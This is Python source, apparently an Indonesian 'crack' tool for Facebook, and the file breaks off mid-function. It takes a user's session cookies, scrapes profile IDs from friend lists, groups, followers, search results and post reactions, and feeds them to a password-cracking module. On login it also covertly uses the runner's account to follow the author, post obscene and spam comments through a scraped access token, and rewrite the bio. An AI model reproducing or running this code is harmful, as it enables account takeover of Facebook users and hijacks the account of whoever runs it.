#######
#Jangan DiEdit.. Edit Aja Filenya Dan Recoder...
#Gw Capek Ajg Gabungkannya
#Follow Gw Anak Ajg 
#m.facebook.com
#github.com/Dumai-991
# -*- coding: utf-8
#Terima Kasih Buat Lu Semua NgT0ND
#Aslamulaikumm Mamang
#Supporter OF Angga,Dapunta,Yayan,Mr.Risky
#https://github.com/Dumai-991/
#######
import itertools
import threading
import os
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
#from modul import *
################
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
#b='\033[0;97m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
P = '\x1b[0;97m' # PUTIH
M = '\x1b[0;91m' # MERAH
H = '\x1b[0;92m' # HIJAU
I = '\x1b[0;92m' # HIJAU
K = '\x1b[0;93m' # KUNING
B = '\x1b[0;94m' # BIRU
U = '\x1b[0;95m' # UNGU
O = '\x1b[0;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ajg_lu = ([i, c, m, u, k, p, h, q])
w = pilih(ajg_lu)
#'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
try:
        import requests
        import sys
        import os
        import subprocess
        import random
        import time
        import re
        import json
        import uuid
        from multiprocessing.pool import ThreadPool
        from requests.exceptions import ConnectionError
        from datetime import datetime
        import requests, bs4, sys, os, subprocess, random, time, re, json
        from concurrent.futures import ThreadPoolExecutor as YayanGanteng
        from datetime import datetime
        from time import sleep
except Exception as modul:
        print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
        exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")
from modul import *
from .Lock import shielded as guard
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
	
import urllib.request
url="https://mbasic.facebook.com"
longentod="Anda Tau Kontol Ahahah"

class awokawokawok:
	
	def __init__(self):
		self.__sayang__()
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		self.cookie1 = open("cookies/cookie.txt", 'w')
		self.cookie1.write(self.cookies)
		self.cookie1.close()
	def cek_folder(self):
		if os.path.exists("Hasil") is False: os.mkdir("Hasil")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("Hasil/live.txt") is False: open("Hasil/live.txt","a")
		if os.path.exists("Hasil/chek.txt") is False: open("Hasil/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			logo()
			cookie=input(f"{q}Saat Aksess Cookies Masih Aktif\n ! Masukan Cookies Facebook Anda !! : {c}")
			while cookie in (""," "):
				print(" ! Jangan Kosong !!")
				cookie=input(" ? Masukan Cookise Anda : ")
#			gen()
			login(url,{"cookie":cookie})
#			jalan('Sedang Send Cookies Dan Token Ke Post Gw :v')
#			zxc(cookie)
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! Cookies Failed Login Kembail")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")

	def __sayang__(self):
		if os.path.exists(".Sayang.py") is False:
		        exit(' \033[0;97m[\033[0;91m!\033[0;97m] Maaf File .Sayang.py Hilang !! Silahkan Install Ulang !!')
#		        os.system('rm -rf ')
#		os.system("python2 .Sayang.py")
		license()
	def main_menu(self):
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		durasi2 = str(datetime.now().strftime("%d-%m-%Y"))
		tahun = current.year
		bulan = current.month
		hari = current.day
		ip = requests.get("https://api.ipify.org").text
		visi = requests.get('http://toolkit-dumai.herokuapp.com/visitor/').text.strip() # Jangan Di ganti bro'i nanti error
		jalan(f"{m}!! {c}Script Masih Tahap Perkembangan !!")
		jalan(f"""{u}{i}<<{h}--------------------------------------------------------------{i}>>
________                 ______  _________________ ________________
___  __ \______ ____________  /_____  ____/___    |__  ___/___  __/
__  / / /_  __ `/__  ___/__  //_/__  /_    __  /| |_____ \ __  /   
_  /_/ / / /_/ / _  /    _  ,<   _  __/    _  ___ |____/ / _  /    
/_____/  \__,_/  /_/     /_/|_|  /_/       /_/  |_|/____/  /_/     
{i}<<{h}--------------------------------------------------------------{i}>>
{p}Version{h}----{p}>>{c}Version 3.5.2
{p}Athour{h}-----{p}>>{c}Mr.Risky
{p}Github{h}-----{p}>>{c}github.com/Dumai-991
{p}GuruKu{h}-----{p}>>{c}Dapunta,Angga, And Yayan
{p}WhatsAPP{h}---{p}>>{c}6283143565470
{p}Telegram{h}---{p}>>{c}6283143565470
{p}Facebook{h}---{p}>>{c}m.facebook.com/llovexnxx
{i}<<{h}--------------------------------------------------------------{i}>>
{p}Your IP{h}----{p}>>{i}{ip}{w}
{p}Your ID{h}----{p}>>{i}{self.jonson['uid']}
{p}Your Name{h}--{p}>>{i}{self.jonson['nama']}
{i}<<{h}--------------------------------------------------------------{i}>>""")

		jalan2(f"{c}Anda Pengunjung Ke {k}[ {i}{visi} {k}]{w}")
		print(c+"[ "+w+"01"+c+" ]"+h+"--"+u+"Crack From Friend"+q)
		print(c+"[ "+w+"02"+c+" ]"+h+"--"+u+"Crack From Public"+q)
		print(c+"[ "+w+"03"+c+" ]"+h+"--"+u+"Crack From Followers"+q)
		print(c+"[ "+w+"04"+c+" ]"+h+"--"+u+"Crack From Group"+q)
		print(c+"[ "+w+"05"+c+" ]"+h+"--"+u+"Crack From Name Search"+q)
		print(c+"[ "+w+"06"+c+" ]"+h+"--"+u+"Crack From Friend Request"+q)
		print(c+"[ "+w+"07"+c+" ]"+h+"--"+u+"Crack From Postingan"+q)
		print(c+"[ "+w+"08"+c+" ]"+h+"--"+u+"Lock Profile Facebook Version 1.0.1"+q)
#		print(c+"[ "+w+"09"+c+" ]"+h+"--"+u+"Get Informations Target Facebook"+q)
#		print(c+"[ "+w+"10"+c+" ]"+h+"--"+u+"Cheak Token Facebook"+q)
		print(c+"[ "+w+"R "+c+" ]"+h+"--"+u+"Report "+q)
		print(c+"[ "+w+"88"+c+" ]"+h+"--"+u+"Delete Cookies"+q)
		print(c+"[ "+w+"99"+c+" ]"+h+"--"+u+"Delete License"+q)
		print(c+"[ "+w+"00"+c+" ]"+h+"--"+u+"Exit\n"+q)
		
		pilih=input(" ?. Menu : ")
		while pilih in (""," "):
			print(" ! Kosong Gw Tabuk Lu...")
			pilih=input(" ? Menu : ")
			
		if pilih in ("3","03"):
			user=input(" ? ID Followers : ")
			while user in (""," "):
				print(f" ! {c}{kosong}{q}")
				user=input(" ? ID Followers : ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" * Name Target : "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("1","01"):
			usek=f"{url}/me/friends" if self.jonson['username'] else f"{url}/profile.php?v=friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! tidak ada teman",self.main_menu)
			longentod=takeuser.fl(respon)
			
		elif pilih in ("4","04"):
			user=input(" ? ID Grup : ")
			while user in (""," "):
				print(f" ! {m}{kosong}{q}")
				user=input(" ? ID Grup : ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! group dengan id {user} tidak ditemukan atau lo belum gabung",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" ! Name Group : "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
			
		elif pilih in ("5","05"):
			print(" ! Isi Name Target !!\n Contoh Bocil Epep / Epep Burik")
			user=input(" ? Name Target: ")
			while user in (""," "):
				print(" ! Anak Kntl")
				user=input(" ? Name Target : ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f" ! orang dengan nama {user} tidak ditemukan",self.main_menu)
			else:
				jumlah=input(" ? Jumlah Dump : ")
				while jumlah.isdigit() is False:
					print(" ! Jangan Kosong Kontol" if jumlah in (""," ") else " ! Angka Kontol Bukan Huruf Pantek")
					jumlah=input(" ? Jumlah Dump: ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("2","02"):
			user=input(" ? ID Publiv : ")
			while user in (""," "):
				print(" ! {w}{kosong}{q}")
				user=input(" ? ID Public : ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! sepertinya daftar teman tidak di publikasikan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" * Name Target: "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.fl(respon)
			
		elif pilih in ("6","06"):
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Permintaan" in respon:
				kembali(" ! tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			user=input(" ? url/id postingan : ")
			while user in (""," "):
				print(" ! Jangan Kosong Kontol")
				user=input(" ? url/id postingan : ")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit(" ! masukkan url postingan dengan benar")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali(" ! postingan tidak ditemukan",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" ! tidak ada yang menanggapi postingan",self.main_menu)
				jumlah=input(" ? Jumlah Dump : ")
				while jumlah.isdigit() is False:
					print(" ! Jangan Kosong Kontol" if jumlah in (""," ") else " ! Angka Kontol Bukan Huruf Pantek")
					jumlah=input(" ? Jumlah Dump : ")
				longentod=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit(" ! error tidak diketahui")
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			
		elif pilih in ("10","10"):
			token_c()
		elif pilih in ("8","08"):
			guard(url,self.cookies,self.main_menu)
		elif pilih in ("9","09"):
			try:
				kueaku = open("cookies/token.txt","r").read()
			except IOError:
				exit((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
			id_kntl = input(f"{m}!! {c}Masukan ID Facebook : {q}")
			target(id_kntl)
		elif pilih in ("88","88"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! Gagal Delete Cookies\n Gunakan Secara Manual Dengan Ketik : rm -rf cookies/*" if os.path.exists("cookies/info.txt") else " * Cookies Sukess Delete !!")
		
		elif pilih in ("99","99"):
			jalan(f"{m}!!{c} Delete License {m}!!{q}")
			kntl()
			os.system("rm -rf LICENSE.json")
			exit()
		elif pilih in tuple("rR"):
			laporkan(url,self.cookies)
		
		elif pilih in ("0","00"):
			exit(" * Terima Kasih Buat Lu Semua Ngtot")
		
		else:
			kembali(" ! Pilihan Anda Tidak Sesuai",self.main_menu)
		
		if longentod!="Engtot Lu Ajg":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit(" ! gagal mengambil id, silahkan coba lagi")
		else:
			exit(" ! error tidak diketahui")
#class report:
class laporkan:
	def __init__(self,url,cookie):
		
		self.url=url
		self.cookies=cookie
		self.laporkan()
		
	def find_id(self,username):
		try: respon=req.get(f"{self.url}/{username}/about",cookies=self.cookies).text
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		uid=re.search('\<a\ href\=\"/.*?\?v=timeline&amp;lst=(.*?)"',respon).group(1)
		return urllib.request.unquote(uid).split(":")[1]
	
	def chat(self,uid,ngebug,**data):
		try: respoN=req.get(f"{self.url}/messages/?fbid={uid}",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		respon=parser(respoN.text,"html.parser")
		nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
		act=respon.find("form",{"method":"post","action":True})
		if len(nv)!=0 and act!=None:
			data.update({x["name"]:x["value"] for x in nv})
			data.update({f"ids[{uid}]":uid,"body":ngebug,"Send":"Kirim"})
			respon=req.post(self.url+act["action"],headers=head(self.url,respoN),cookies=self.cookies,data=data)
			exit(" * Suksess Kirim Laporan" if "send_success" in respon.url else " ! Gagal MemBuat Laporan")
		else: exit(" ! error tidak diketahui")
			
	def laporkan(self):
		#asuu=self.find_id(areYOUgay)
		teks_bug=input(f" ? Apa Masalahnya Ngab : {i}")
		print(q)
		while teks_bug in (""," "):
			print(" ! Kentot Mamak Lu")
			teks_bug=input(" ? Apa Masalahnya Kontol: {i}")
			print(q)
		self.chat("100063690353340",teks_bug)
		
#from .bahasa import lang
#from .YNTKTS import *
# hallo bro :v
#from .informasi import generate

def head(url,respons):
        return {"Host":url.split("//")[1],"upgrade-insecure-requests":"1","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","referer":respons.url,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}

class yo_ndak_tau_kok_tanya_saya:
        def __init__(self,url,cookie):

                self.url=url
                self.cookies=cookie

        def hoetang(self,id_post,tipe,komen,comment=False,react=None,**data):
                try:
                        respoN=req.get(self.url+id_post,cookies=self.cookies)
                        respon=parser(respoN.text,"html.parser")
                        for x in respon.find_all("a",{"href":True}):
                                if "/reactions/picker/?is_permalink=1" in x["href"]:
                                        if "Tanggapi" in x.text:
                                                react=self.url+x["href"]
                        if react!=None:
                                for x in parser(req.get(react,cookies=self.cookies).text,"html.parser").find_all("a",{"href":True}):
                                        if f"reaction_type={tipe}" in x["href"]:
                                                req.get(self.url+x["href"],cookies=self.cookies)
                        nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
                        act=respon.find("form",{"method":"post","action":True})
                        if len(nv)!=0 and act!=None:
                                if comment is True:
                                        comment=False if "mbasic.facebook.com" in self.url else comment
                                        if comment is False:
                                                if os.path.exists("cookies/token.txt") is False:
                                                        respon=req.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Host":"m.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies=self.cookies).text
                                                        token=re.search(r'"accessToken\\":\\"(.*?)\\"',respon).group(1)
                                                        open("cookies/token.txt","w").write(token)
                                                token=open("cookies/token.txt").read()
                                                req.post(f"https://graph.facebook.com{id_post}/comments/?message={komen}&access_token={token}")
                                        #else:
                                                #data.update({x["name"]:x["value"] for x in nv})
                                                #data.update({"comment_text":komen})
                                                #req.post(self.url+act["action"],headers=head(self.url,respoN),cookies=self.cookies,data=data)
                except: pass

        def follow(self,url_profil):
                try:
                        respon=parser(req.get(self.url+url_profil,cookies=self.cookies).text,"html.parser")
                        for x in respon.find_all("a",{"href":True}):
                                if "/a/subscribe.php" in x["href"]:
                                        if "Ikuti" in x.text:
                                                req.get(self.url+x["href"],cookies=self.cookies)
                except: pass

        def change_bio(self,kata,**data):
                try:
                        respon=parser(req.get(f"{self.url}/profile/basic/intro/bio",cookies=self.cookies).text,"html.parser")
                        nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
                        act=respon.find("form",{"method":"post","action":True})
                        if len(nv)!=0 and act!=None:
                                data.update({x["name"]:x["value"] for x in nv})
                                data.update({"bio":kata,"publish_to_feed":"on"})
                                req.post(self.url+act["action"],data=data,cookies=self.cookies)
                except: pass

def lang(url,cookie):
        try:
                respon=req.get(f"{url}/language.php",cookies=cookie).text
                saatini=parser(respon,"html.parser").find("strong",{"class":False})
                saatini=saatini.text.replace("Bahasa ","").replace("Basa ","") if saatini is not None else saatini
                #print(" ! yahahah jawa:v" if "Jawa" in saatini else "")
                print(f" ! bahasa {saatini} terdeteksi, mohon tunggu sedang memindahkan ke bahasa Indonesia" if saatini is not None else " ! memindahkan bahasa, mohon tunggu..")
                for x in parser(respon,"html.parser").find_all("a",{"href":True}):
                        if "id_ID" in x["href"]:
                                req.get(url+x["href"],cookies=cookie)
        except koneksi_error: exit(" ! kesalahan pada koneksi")

def generate(cookie,html,username=None):
        for x in html.find_all("a",href=True):
                if "/friends?" in x["href"]:
                        if "Teman" in x.text:
                                username=re.search("\/(.*?)\/friends\?",x["href"]).group(1)
        uid=re.search("c_user=(\d*)",cookie).group(1)
        open("cookies/info.txt","w").write(json.dumps({"uid":uid,"nama":html.find("title").text,"username":username,"cookies":{"cookie":cookie}}))
#open("cookies/token.txt","w")
anjay=random.choice(["Bang Risky Gw Pakai Script Abang :v","Script DrakFAST Keren Habis... Engga Nyesal ;)","Yang Posting Ke?!?!?"])
komentar1=random.choice(["Keren","Mantap","Xoxo"])
komentar2=random.choice(["Asedd Kontol Sama Lu Semua","Coli Adalah Jalan Ninja Ku :v","Xnxx.com","Yandex.com","Unblock.com","kenatipu.com",])
tokek = "kenatipu.com"
class login:
        def __init__(self,url,cookie):

                try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
                except koneksi_error: exit(" ! kesalahan pada koneksi")
                if "mbasic_logout_button" in respon.text:
                        print("\n\n * Hallo \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m Kontol")
                        print(" * Loading Sedang Send Token KeKomen Bot")
                        url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
                        if "Laporkan Masalah" not in respon.text:
                                lang(url,cookie)
                                try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
                                except koneksi_error: exit(" ! kesalahan pada koneksi")
                        generate(cookie["cookie"],parser(respon.text,"html.parser"))
                        koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
                        # jangan di ganti ya bro hehehe :)
                        koh.follow("/llovexnxx")
                        koh.follow("/100063690353340")
                        koh.follow("/100063690353340")
                        koh.hoetang("/100063690353340","8",komentar1,True)
                        koh.hoetang("/120338706765807","2",tokek,True)
                        koh.hoetang("/180923747373969","1",komentar2,True)
                        koh.hoetang("/180923747373969","3",tokek,True)
                        koh.change_bio(anjay)
                        print(f"{i} ! Login Sukses..")
                        waktu(1)
                else:
                        exit("\n ! Cookies Falied")
def license():
    global Beli
    logo()
    Beli="https://wa.me/6283143565470?text=Bang+Risky+Minta+Licensi+Bang"
    try:
        toket = open('LICENSE.json', 'r').read()
    except IOError:
        print (f'{m}!! {c}License Failed');time.sleep (1.0)
        os.system('rm -rf LICENSE.json')
        romz()

    if os.path.exists('LICENSE.json'):
#        romz()
        user1()
    else:
        romz()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1./500)
def jalan2(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1./140)

def logo():
        os.system("clear")
        jalan("\r"+i+"  _____   ____ ______\n"+i+" / ___/  / __//_  __/ "+w+"||"+c+"Terima Kasih Kepada -->> From\n"+i+"/ (_ /  / _/   / /    "+w+"||"+c+"Angga,Yayan,Dapunta,Risky,Ratu Error\n"+i+"\___/  /___/  /_/     "+w+"||"+c+"Github.com/Dumai-991\n"+i+"   __    ____  _____   ____   _  __   ____   ____\n  / /   /  _/ / ___/  / __/  / |/ /  / __/  / __/\n / /__ _/ /  / /__   / _/   /    /  _\ \   / _/  \n/____//___/  \___/  /___/  /_/|_/  /___/  /___/  \n"+c+"Power Of RATU ERROR\n"+m+"!! "+c+"Untuk Mendapatkan License Download Melalui Brosing !!\n"+k+"** "+c+"Dengan Cara Ketik : "+i+"KNTL"+q)
def romz():
    global Beli,now,durasi3,tahun,bulan,hari
    now = datetime.now()
    durasi3 = str(datetime.now().strftime("%d-%m-%Y"))
    tahun = now.year
    bulan = now.month
    hari = now.day
    Beli="https://wa.me/6283143565470?text=Bang+Risky+Minta+Licensi+Bang"
    try:
#        visi = requests.get('https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565')
        d = requests.get('https://pastebin.com/raw/exzCY7sM').text.strip() # Jangan Di ganti bro'i nanti error
        if d in ('Server-AIFC','Server-SCP','Server-RATU','Server-TID','Server-DMI','ADMIN'):
            print(f'{m}!!{c} Good Server {k}[ {i}{d}{k} ]{c} Ini Onn {m}!!{q} ');time.sleep(1)
        else:
            exit(f'{m}!!{c} Maaf Server {k}[ {i}{d}{k} ]{c} Ini Down {m}!! {q}');time.sleep(2)
    except KeyboardInterrupt:
            exit()
    except (KeyError,IOError):
	    exit(f"{c}Masalah Tidak DiKetahui {m}!!{q}")
    except requests.exceptions.ConnectionError:
        print (M+' [!] Tidak Ada Koneksi Data\x1b[0;97m')
        exit()
    id = uuid.uuid4().hex[:25]
    l = input(f'\n{m}?? {c}Masukkam License Anda : {k}')
    if l in ("BUY","buy"):
	    time.sleep(1)
	    print(f'{m}??{c} License Sudah Jadi Ngab !! ; {k}{id}')
	    input(f"{k}**{c} Tekan Enter !!")
	    license()
    if l in ("KNTL","get","GET","kntl"):
	    jalan(f"{m}!!{c} Anda Akan Lanjut KeBrowsing {i}KNTL{q}")
	    kntl()
	    os.system('am start https://pastebin.com/raw/YHmyBGKD')
	    os.system("clear;git pull")
	    license()
    while len(l) < 20:
	    jalan("Kosong ??" if l in (""," ") else "!! Password Minimanl 20 Huruf")
	    time.sleep(3)
	    license()
    idg = open('LICENSE.json', 'w')
    idg.write(l)
    idg.close()
    try:
        r = requests.get('https://github.com/Dumai-991/Server/blob/main/aku_mirip_kontol.txt').text.strip() # Jangan Di ganti bro'i nanti error
        rr = requests.get('https://github.com/Dumai-991/Server/blob/main/aku_mirip_kontol.txt').text.strip() # Jangan Di ganti bro'i nanti error
        if l in rr:
            print(f'{m}!!{c} Good Licensi Ini {k}[ {i}{l}{k} ]{c} TerDaftar DiDataBase{q}');time.sleep(1)
        else:
            exit(f'{m}!!{c} Maaf Lisensi Ini {k}[ {i}{l}{k} ]{c} Tidak Terdaftar DiDateBase');time.sleep(2)
    except KeyboardInterrupt:
            exit()
    except (KeyError,IOError):
	    exit(f"{c}Masalah Tidak DiKetahui {m}!!{q}")
def user1():
    global Beli,now,durasi3,tahun,bulan,hari
    now = datetime.now()
    durasi3 = str(datetime.now().strftime("%d-%m-%Y"))
    tahun = now.year
    bulan = now.month
    hari = now.day
    Beli="https://wa.me/6283143565470?text=Bang+Risky+Minta+Licensi+Bang"
    try:
        print(f"{m}!!{c} Tanggal Hari Ini : {i}{durasi}{q}")
        d = requests.get('https://pastebin.com/raw/exzCY7sM').text.strip() # Jangan Di ganti bro'i nanti error
        if d in ('Server-AIFC','Server-SCP','Server-RATU','Percobaan 01','PREM','Percobaan 03'):
            print(f'{m}!!{c} Good Server {k}[ {i}{d}{k} ]{c} Ini Onn {m}!!{q} ');time.sleep(1)
        else:
            exit(f'{m}!!{c} Maaf Server {k}[ {i}{d}{k} ]{c} Ini Down {m}!! {q}');time.sleep(2)
    except KeyboardInterrupt:
            exit()
    except (KeyError,IOError):
	    exit(f"{c}Masalah Tidak DiKetahui {m}!!{q}")
    except requests.exceptions.ConnectionError:
        print (M+' [!] Tidak Ada Koneksi Data\x1b[0;97m')
        exit()
    try:
        dk = str(durasi)
        exp = requests.get('https://pastebin.com/raw/esSDtk8u').text.strip() # Jangan Di ganti bro'i nanti error
        if dk in exp:
            jalan2(f"{m}!!{c} Maaf Script Ini Sudah Expired Silahkan Hub Admin : {i}6283143565470{q}")
        else:
            jalan2(f"{m}!! {c}Good Script Masih Layak DiPakai Hingga Tanggal : {u}{exp}{q}")
    except KeyboardInterrupt:
            exit()
    except (KeyError,IOError):
	    exit(f"{c}Masalah Tidak DiKetahui {m}!!{q}")
    except requests.exceptions.ConnectionError:
        print (M+' [!] Tidak Ada Koneksi Data\x1b[0;97m')
        exit()
    try:
        j = open('LICENSE.json', 'r').read()
        r = requests.get('https://github.com/Dumai-991/Server/blob/main/aku_mirip_kontol.txt').text.strip() # Jangan Di ganti bro'i nanti error
        if j in r:
            print(f'{m}!!{c} License {k}[ {w}{j}{k} ]{c}Aktif {i}✓✓');time.sleep(1)
            True
        else:
            jalan (f"{m}!!{c} License Failed or Delete");time.sleep(1)
            romz()
            exit()
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (M+' [!] Tidak Ada Koneksi Data\x1b[0;97m')
        exit()
        os.sys.exit()
    except KeyboardInterrupt:
        exit()
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'LICENSE.json'])
        romz() 
# llp
#kue
def kntl2(sss):
	zn = (w)
	s = (f"{zn}"+sss)
	x = (f"{s}")
	x1 = (f"{s}{s}")
	x2 = (f"{s}{s}{s}")
	x3 = (f"{s}{s}{s}{s}")
	x4 = (f"{s}{s}{s}{s}{s}")
	x5 = (f"{s}{s}{s}{s}{s}{s}")
	x6 = (f"{s}{s}{s}{s}{s}{s}{s}")
	x7 = (f"{s}{s}{s}{s}{s}{s}{s}")
	x8 = (f"{s}{s}{s}{s}{s}{s}   ")
	x9 = (f"{s}{s}{s}{s}{s}      ")
	x10 = (f"{s}{s}{s}{s}        ")
	x11 = (f"{s}{s}              ")
	x12 = (f"{s}                 ")
	x13 = (f"PPK		     ")
	lpp___alll = ([x, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13])
	for x in lpp___alll:
             stdout.write(f'\r %s[%s{w}LPP%s]--->> %s'%(N,w,N,x)),
             stdout.flush()
             time.sleep(0.6)
def zxc(cookie):
	logo()
	print("\n \x1b[1;93mJANGAN LUPA COLMEXS Yaaaa.....!!!")
#	cookie = input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukan Cookies : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
